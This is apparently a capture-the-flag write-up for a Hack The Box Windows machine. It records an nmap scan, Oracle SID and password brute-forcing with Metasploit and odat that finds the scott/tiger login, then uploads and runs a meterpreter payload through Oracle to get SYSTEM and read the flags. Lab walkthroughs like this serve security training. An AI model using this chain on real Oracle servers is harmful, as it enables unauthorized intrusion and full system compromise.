# README

## nmap

```shell
sudo nmap -T4 -A -v 10.10.10.82
Password:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-13 10:38 CST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:38
Completed NSE at 10:38, 0.00s elapsed
Initiating NSE at 10:38
Completed NSE at 10:38, 0.00s elapsed
Initiating NSE at 10:38
Completed NSE at 10:38, 0.00s elapsed
Initiating Ping Scan at 10:38
Scanning 10.10.10.82 [4 ports]
Completed Ping Scan at 10:38, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:38
Completed Parallel DNS resolution of 1 host. at 10:38, 0.04s elapsed
Initiating SYN Stealth Scan at 10:38
Scanning 10.10.10.82 [1000 ports]
Discovered open port 80/tcp on 10.10.10.82
Discovered open port 445/tcp on 10.10.10.82
Discovered open port 135/tcp on 10.10.10.82
Discovered open port 139/tcp on 10.10.10.82
Discovered open port 49152/tcp on 10.10.10.82
Discovered open port 1521/tcp on 10.10.10.82
Discovered open port 49161/tcp on 10.10.10.82
Discovered open port 49153/tcp on 10.10.10.82
Discovered open port 49160/tcp on 10.10.10.82
Discovered open port 49155/tcp on 10.10.10.82
Discovered open port 49159/tcp on 10.10.10.82
Discovered open port 49154/tcp on 10.10.10.82
Completed SYN Stealth Scan at 10:38, 2.13s elapsed (1000 total ports)
Initiating Service scan at 10:38
Scanning 12 services on 10.10.10.82
Service scan Timing: About 50.00% done; ETC: 10:40 (0:00:57 remaining)
Completed Service scan at 10:40, 123.97s elapsed (12 services on 1 host)
Initiating OS detection (try #1) against 10.10.10.82
Retrying OS detection (try #2) against 10.10.10.82
Retrying OS detection (try #3) against 10.10.10.82
Retrying OS detection (try #4) against 10.10.10.82
Retrying OS detection (try #5) against 10.10.10.82
Initiating Traceroute at 10:40
Completed Traceroute at 10:40, 0.23s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 10:40
Completed Parallel DNS resolution of 2 hosts. at 10:40, 5.51s elapsed
NSE: Script scanning 10.10.10.82.
Initiating NSE at 10:40
Completed NSE at 10:40, 9.52s elapsed
Initiating NSE at 10:40
Completed NSE at 10:40, 1.15s elapsed
Initiating NSE at 10:40
Completed NSE at 10:40, 0.00s elapsed
Nmap scan report for 10.10.10.82
Host is up (0.21s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
|_http-title: IIS Windows Server
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49160/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=9/13%OT=80%CT=1%CU=35528%PV=Y%DS=2%DC=T%G=Y%TM=6501213
OS:2%P=arm-apple-darwin21.6.0)SEQ(SP=102%GCD=1%ISR=106%TI=I%CI=I%II=I%SS=S%
OS:TS=7)OPS(O1=M539NW8ST11%O2=M539NW8ST11%O3=M539NW8NNT11%O4=M539NW8ST11%O5
OS:=M539NW8ST11%O6=M539ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=
OS:2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M539NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF
OS:=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%
OS:RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W
OS:=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%D
OS:FI=N%T=80%CD=Z)

Uptime guess: 0.004 days (since Wed Sep 13 10:35:29 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2023-09-13T02:40:41
|_  start_date: 2023-09-13T02:35:40
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode:
|   302:
|_    Message signing enabled but not required

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   227.41 ms 10.10.14.1
2   226.53 ms 10.10.10.82

NSE: Script Post-scanning.
Initiating NSE at 10:40
Completed NSE at 10:40, 0.00s elapsed
Initiating NSE at 10:40
Completed NSE at 10:40, 0.00s elapsed
Initiating NSE at 10:40
Completed NSE at 10:40, 0.00s elapsed
Read data files from: /opt/homebrew/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 156.01 seconds
           Raw packets sent: 1099 (51.966KB) | Rcvd: 1094 (47.378KB)

```

135、139、445端口测试拿不到信息，因此注意1521端口。

## 1521端口 oracle

爆破SID：

```shell
msf6 auxiliary(admin/oracle/sid_brute) > exploit
[*] Running module against 10.10.10.82

[*] 10.10.10.82:1521 - Starting brute force on 10.10.10.82, using sids from /opt/metasploit-framework/embedded/framework/data/wordlists/sid.txt...
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'XE'
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'PLSExtProc'

exit
```

msf似乎爆破一半就卡住了，用odat：

```shell
python odat.py sidguesser -s 10.10.10.82 -p 1521

[1] (10.10.10.82:1521): Searching valid SIDs
[1.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server
[+] 'XE' is a valid SID. Continue...              ####################################### | ETA:  00:00:03
100% |####################################################################################| Time: 00:06:33
[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.10.10.82:1521)
100% |####################################################################################| Time: 00:00:13
[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.10.10.82:1521)
  7% |#####
```

只爆出了XE，似乎比msf更少，比网上的odat爆的也少。



爆出SID后爆破用户名和密码：

```shell
python odat.py passwordguesser -s 10.10.10.82 -d XE --accounts-file accounts/accounts.txt

[1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521
The login abm has already been tested at least once. What do you want to do:              | ETA:  --:--:--
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
c
[!] Notice: 'ctxsys' account is locked, so skipping this username for password            | ETA:  00:23:07
[!] Notice: 'dbsnmp' account is locked, so skipping this username for password            | ETA:  00:22:16
[!] Notice: 'dip' account is locked, so skipping this username for password               | ETA:  00:21:11
[!] Notice: 'hr' account is locked, so skipping this username for password                | ETA:  00:17:09
[!] Notice: 'mdsys' account is locked, so skipping this username for password             | ETA:  00:13:10
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password        | ETA:  00:10:15
[!] Notice: 'outln' account is locked, so skipping this username for password             | ETA:  00:09:15
[+] Valid credentials found: scott/tiger. Continue...                                     | ETA:  00:05:03
```



传马：

```shell
root@92229bf89f9f:~/odat# python odat.py utlfile -s 10.10.10.82 -d XE -U scott -P tiger --putFile 'c:\\Windows\\Temp' msfshell.exe  /root/htb/msfshell.exe --sysdba

[1] (10.10.10.82:1521): Put the /root/htb/msfshell.exe local file in the c:\\Windows\\Temp folder like msfshell.exe on the 10.10.10.82 server
[+] The /root/htb/msfshell.exe file was created on the c:\\Windows\\Temp directory on the 10.10.10.82 server like the msfshell.exe file
```

执行：

```shell
root@92229bf89f9f:~/odat# python odat.py externaltable -s 10.10.10.82 -d XE -U scott -P tiger --exec 'c:\\Windows\\Temp' msfshell.exe --sysdba

[1] (10.10.10.82:1521): Execute the msfshell.exe command stored in the c:\\Windows\\Temp path
```

直接就是system：

```shell
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : SILO
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_GB
Domain          : HTB
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > search -f user.txt
Found 1 result...
=================

Path                               Size (bytes)  Modified (UTC)
----                               ------------  --------------
c:\Users\Phineas\Desktop\user.txt  34            2023-09-13 10:36:09 +0800

meterpreter > search -f root.txt
Found 1 result...
=================

Path                                     Size (bytes)  Modified (UTC)
----                                     ------------  --------------
c:\Users\Administrator\Desktop\root.txt  34            2023-09-13 10:36:09 +0800

meterpreter > cat 'c:\Users\Phineas\Desktop\user.txt'
c7cddcf03fc4bc3d6d9595f70919469b
meterpreter > cat 'c:\Users\Administrator\Desktop\root.txt'
accda84e8a5542c218e6cb8445d48bbe
meterpreter >
```

